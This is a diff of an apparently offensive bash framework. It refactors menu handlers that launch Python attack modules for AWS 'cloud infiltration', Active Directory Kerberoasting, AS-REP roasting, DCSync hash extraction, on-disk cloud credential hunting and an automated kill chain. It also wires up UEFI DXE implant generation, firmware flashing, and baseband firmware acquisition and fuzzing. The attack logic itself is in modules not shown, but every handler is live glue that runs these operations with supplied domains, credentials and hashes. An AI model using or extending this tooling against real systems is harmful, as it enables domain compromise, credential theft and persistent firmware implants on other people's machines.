@@ -8569,13 +8569,13 @@ cmd_cloud() {
             ;;
         aws)
             echo -e "${Y}[*] AWS Cloud Infiltration${N}"
-            python3 - "$MOD" << 'PYEOF'
-import sys; sys.path.insert(0,''); exec(open(sys.argv[1]).read())
+            python3 -c "
+import sys; sys.path.insert(0,'$DIR/op/modules')
 from cloud_infiltrate import cloud_auto
 import json
 result = cloud_auto('aws')
 print(json.dumps(result, indent=2, default=str))
-PYEOF
+"
             ;;
         azure)
             echo -e "${Y}[*] Azure Cloud Infiltration${N}"
@@ -8782,9 +8782,8 @@ cmd_adchain() {
             echo -e "${Y}[*] AD Recon: $DOMAIN @ $DCIP${N}"
             python3 -c "
 import sys; sys.path.insert(0,'$DIR/op/modules')
-from ad_cloud_chain import ADCloudChain
-c = ADCloudChain('$DOMAIN','$DCIP','${USER:-}','${PASS:-}',None)
-import json; print(json.dumps(c.ad_recon(), indent=2, default=str))
+from ad_cloud_chain import ad_recon
+import json; print(json.dumps(ad_recon('$DOMAIN','$DCIP','${USER:-}','${PASS:-}'), indent=2, default=str))
 "
             ;;
         roast)
@@ -8795,9 +8794,8 @@ import json; print(json.dumps(c.ad_recon(), indent=2, default=str))
             echo -e "${Y}[*] Kerberoast: $DOMAIN${N}"
             python3 -c "
 import sys; sys.path.insert(0,'$DIR/op/modules')
-from ad_cloud_chain import ADCloudChain
-c = ADCloudChain('$DOMAIN','$DCIP','$USER','$PASS',None)
-import json; print(json.dumps(c.kerberoast(), indent=2, default=str))
+from ad_cloud_chain import kerberoast
+import json; print(json.dumps(kerberoast('$DOMAIN','$DCIP','$USER','$PASS'), indent=2, default=str))
 "
             ;;
         asrep)
@@ -8806,9 +8804,8 @@ import json; print(json.dumps(c.kerberoast(), indent=2, default=str))
             echo -e "${Y}[*] AS-REP Roast (no creds): $DOMAIN${N}"
             python3 -c "
 import sys; sys.path.insert(0,'$DIR/op/modules')
-from ad_cloud_chain import ADCloudChain
-c = ADCloudChain('$DOMAIN','$DCIP','','',None)
-import json; print(json.dumps(c.asrep_roast(), indent=2, default=str))
+from ad_cloud_chain import asrep_roast
+import json; print(json.dumps(asrep_roast('$DOMAIN','$DCIP'), indent=2, default=str))
 "
             ;;
         dcsync)
@@ -8821,18 +8818,16 @@ import json; print(json.dumps(c.asrep_roast(), indent=2, default=str))
             echo -e "${Y}[*] DCSync: $TUSER from $DOMAIN${N}"
             python3 -c "
 import sys; sys.path.insert(0,'$DIR/op/modules')
-from ad_cloud_chain import ADCloudChain
-c = ADCloudChain('$DOMAIN','$DCIP','$USER','${PASS:-}','${HASH:-}')
-import json; print(json.dumps(c.dcsync('$TUSER'), indent=2, default=str))
+from ad_cloud_chain import dcsync
+import json; print(json.dumps(dcsync('$DOMAIN','$DCIP','$USER','${PASS:-}','${HASH:-}','$TUSER'), indent=2, default=str))
 "
             ;;
         hunt)
             echo -e "${Y}[*] Hunting cloud credentials on disk...${N}"
             python3 -c "
 import sys; sys.path.insert(0,'$DIR/op/modules')
-from ad_cloud_chain import ADCloudChain
-c = ADCloudChain('','','','',None)
-import json; print(json.dumps(c.cloud_cred_hunt(), indent=2, default=str))
+from ad_cloud_chain import cloud_cred_hunt
+import json; print(json.dumps(cloud_cred_hunt(), indent=2, default=str))
 "
             ;;
         chain)
@@ -8845,9 +8840,8 @@ import json; print(json.dumps(c.cloud_cred_hunt(), indent=2, default=str))
             [[ "$yn" =~ ^[Yy]$ ]] || { echo "Aborted."; return; }
             python3 -c "
 import sys; sys.path.insert(0,'$DIR/op/modules')
-from ad_cloud_chain import ADCloudChain
-c = ADCloudChain('$DOMAIN','$DCIP','$USER','$PASS',None)
-import json; print(json.dumps(c.kill_chain(), indent=2, default=str))
+from ad_cloud_chain import kill_chain
+import json; print(json.dumps(kill_chain('$DOMAIN','$DCIP','$USER','$PASS'), indent=2, default=str))
 "
             ;;
         *)
@@ -8896,10 +8890,8 @@ cmd_uefi() {
             echo -e "${Y}[*] Extracting firmware to $OUTF${N}"
             python3 -c "
 import sys; sys.path.insert(0,'$DIR/op/modules')
-from uefi_implant import UEFIResearch
-u = UEFIResearch()
-r = u.extract_firmware_chipsec('$OUTF')
-print(r)
+from uefi_implant import extract_firmware_chipsec
+import json; print(json.dumps(extract_firmware_chipsec('$OUTF'), indent=2, default=str))
 "
             ;;
         analyze)
@@ -8908,18 +8900,16 @@ print(r)
             echo -e "${Y}[*] Analyzing $FW${N}"
             python3 -c "
 import sys; sys.path.insert(0,'$DIR/op/modules')
-from uefi_implant import UEFIResearch
-u = UEFIResearch()
-import json; print(json.dumps(u.analyze_firmware('$FW'), indent=2, default=str))
+from uefi_implant import analyze_firmware
+import json; print(json.dumps(analyze_firmware('$FW'), indent=2, default=str))
 "
             ;;
         secureboot)
             echo -e "${Y}[*] Checking Secure Boot status${N}"
             python3 -c "
 import sys; sys.path.insert(0,'$DIR/op/modules')
-from uefi_implant import UEFIResearch
-u = UEFIResearch()
-import json; print(json.dumps(u.check_secure_boot(), indent=2, default=str))
+from uefi_implant import check_secure_boot
+import json; print(json.dumps(check_secure_boot(), indent=2, default=str))
 "
             ;;
         implant)
@@ -8928,18 +8918,16 @@ import json; print(json.dumps(u.check_secure_boot(), indent=2, default=str))
             echo -e "${Y}[*] Generating DXE implant for $PAYLOAD${N}"
             python3 -c "
 import sys; sys.path.insert(0,'$DIR/op/modules')
-from uefi_implant import UEFIResearch
-u = UEFIResearch()
-import json; print(json.dumps(u.generate_dxe_driver('$PAYLOAD'), indent=2, default=str))
+from uefi_implant import generate_dxe_driver
+import json; print(json.dumps(generate_dxe_driver('$PAYLOAD'), indent=2, default=str))
 "
             ;;
         flash)
             echo -e "${R}[!] Flash firmware — DANGEROUS, one-way operation${N}"
             python3 -c "
 import sys; sys.path.insert(0,'$DIR/op/modules')
-from uefi_implant import UEFIResearch
-u = UEFIResearch()
-u.flash_firmware()
+from uefi_implant import flash_firmware
+flash_firmware()
 "
             ;;
         qemu)
@@ -8948,9 +8936,8 @@ u.flash_firmware()
             echo -e "${Y}[*] Setting up OVMF QEMU test environment${N}"
             python3 -c "
 import sys; sys.path.insert(0,'$DIR/op/modules')
-from uefi_implant import UEFIResearch
-u = UEFIResearch()
-import json; print(json.dumps(u.setup_qemu_test('${IMPLANT:-}', '$QDIR'), indent=2, default=str))
+from uefi_implant import setup_qemu_test
+import json; print(json.dumps(setup_qemu_test('${IMPLANT:-}', '$QDIR'), indent=2, default=str))
 "
             ;;
         integrity)
@@ -8959,9 +8946,8 @@ import json; print(json.dumps(u.setup_qemu_test('${IMPLANT:-}', '$QDIR'), indent
             echo -e "${Y}[*] Integrity check: $FW vs $BASE${N}"
             python3 -c "
 import sys; sys.path.insert(0,'$DIR/op/modules')
-from uefi_implant import UEFIResearch
-u = UEFIResearch()
-import json; print(json.dumps(u.firmware_integrity_check('$FW','$BASE'), indent=2, default=str))
+from uefi_implant import firmware_integrity_check
+import json; print(json.dumps(firmware_integrity_check('$FW','$BASE'), indent=2, default=str))
 "
             ;;
         scan)
@@ -8969,9 +8955,8 @@ import json; print(json.dumps(u.firmware_integrity_check('$FW','$BASE'), indent=
             echo -e "${Y}[*] Scanning $ESP for unknown EFI binaries${N}"
             python3 -c "
 import sys; sys.path.insert(0,'$DIR/op/modules')
-from uefi_implant import UEFIResearch
-u = UEFIResearch()
-import json; print(json.dumps(u.scan_esp_for_implants('$ESP'), indent=2, default=str))
+from uefi_implant import scan_esp_for_implants
+import json; print(json.dumps(scan_esp_for_implants('$ESP'), indent=2, default=str))
 "
             ;;
         *)
@@ -9020,17 +9005,15 @@ cmd_baseband() {
             if [ "$METHOD" = "1" ]; then
                 python3 -c "
 import sys; sys.path.insert(0,'$DIR/op/modules')
-from baseband_research import BasebandResearch
-b = BasebandResearch()
-import json; print(json.dumps(b.acquire_firmware_adb(), indent=2, default=str))
+from baseband_research import acquire_firmware_adb
+import json; print(json.dumps(acquire_firmware_adb(), indent=2, default=str))
 "
             else
                 read -rp "  Vendor (samsung/qualcomm/mediatek): " VENDOR
                 python3 -c "
 import sys; sys.path.insert(0,'$DIR/op/modules')
-from baseband_research import BasebandResearch
-b = BasebandResearch()
-import json; print(json.dumps(b.acquire_firmware_ota('$VENDOR'), indent=2, default=str))
+from baseband_research import acquire_firmware_ota
+import json; print(json.dumps(acquire_firmware_ota('$VENDOR'), indent=2, default=str))
 "
             fi
             ;;
@@ -9040,9 +9023,8 @@ import json; print(json.dumps(b.acquire_firmware_ota('$VENDOR'), indent=2, defau
             echo -e "${Y}[*] Identifying $FW${N}"
             python3 -c "
 import sys; sys.path.insert(0,'$DIR/op/modules')
-from baseband_research import BasebandResearch
-b = BasebandResearch('$FW')
-import json; print(json.dumps(b.identify_firmware(), indent=2, default=str))
+from baseband_research import identify_firmware
+import json; print(json.dumps(identify_firmware('$FW'), indent=2, default=str))
 "
             ;;
         analyze)
@@ -9051,9 +9033,8 @@ import json; print(json.dumps(b.identify_firmware(), indent=2, default=str))
             echo -e "${Y}[*] Analyzing $FW${N}"
             python3 -c "
 import sys; sys.path.insert(0,'$DIR/op/modules')
-from baseband_research import BasebandResearch
-b = BasebandResearch('$FW')
-import json; print(json.dumps(b.analyze_shannon(), indent=2, default=str))
+from baseband_research import analyze_shannon
+import json; print(json.dumps(analyze_shannon('$FW'), indent=2, default=str))
 "
             ;;
         qemu)
@@ -9063,21 +9044,18 @@ import json; print(json.dumps(b.analyze_shannon(), indent=2, default=str))
             echo -e "${Y}[*] Setting up QEMU emulation for $FW${N}"
             python3 -c "
 import sys; sys.path.insert(0,'$DIR/op/modules')
-from baseband_research import BasebandResearch
-b = BasebandResearch('$FW')
-import json; print(json.dumps(b.setup_qemu_emulation('$WDIR'), indent=2, default=str))
+from baseband_research import setup_qemu_emulation
+import json; print(json.dumps(setup_qemu_emulation('$FW', out_dir='$WDIR'), indent=2, default=str))
 "
             ;;
         fuzz)
-            read -rp "  Firmware path: " FW
-            [ -z "$FW" ] && { err "Firmware path required"; return; }
+            read -rp "  Firmware path (blank = generate generic harness): " FW
             read -rp "  Harness output dir [/tmp/bb_fuzz]: " HDIR; HDIR="${HDIR:-/tmp/bb_fuzz}"
-            echo -e "${Y}[*] Setting up fuzzing harness for $FW${N}"
+            echo -e "${Y}[*] Setting up fuzzing harness${N}"
             python3 -c "
 import sys; sys.path.insert(0,'$DIR/op/modules')
-from baseband_research import BasebandResearch
-b = BasebandResearch('$FW')
-import json; print(json.dumps(b.setup_fuzzing_harness('$HDIR'), indent=2, default=str))
+from baseband_research import setup_fuzzing_harness
+import json; print(json.dumps(setup_fuzzing_harness(fw_path='${FW:-}', out_dir='$HDIR'), indent=2, default=str))
 "
             echo -e "${Y}[*] To build + run AFL++:${N}"
             echo "    cd $HDIR && bash build.sh"
@@ -9087,9 +9065,8 @@ import json; print(json.dumps(b.setup_fuzzing_harness('$HDIR'), indent=2, defaul
             echo -e "${Y}[*] Baseband CVE catalog${N}"
             python3 -c "
 import sys; sys.path.insert(0,'$DIR/op/modules')
-from baseband_research import BasebandResearch
-b = BasebandResearch()
-b.cve_analysis()
+from baseband_research import cve_analysis
+cve_analysis()
 "
             ;;
         *)
